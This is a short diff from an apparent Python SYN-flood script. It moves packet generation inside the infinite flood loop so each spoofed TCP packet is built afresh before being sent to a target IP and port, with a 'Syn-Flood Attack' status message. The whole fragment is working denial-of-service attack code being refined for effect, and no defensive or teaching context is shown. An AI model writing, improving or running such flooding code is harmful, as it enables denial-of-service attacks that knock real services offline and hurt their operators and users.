@@ -199,11 +199,11 @@ while True:
                 TCP_Packet.window = gen_num()
                 packet = IP_Packet / TCP_Packet
                 return packet
-            packet = gen_packet()
             def flood():
                 global sent
                 while True:
                     try:
+                        packet = gen_packet()
                         print(f"[+] Syn-Flood Attack IP: {ip} Connections Started: {sent}")
                         s.sendto(bytes(packet), (ip, port))
                         sent += 1
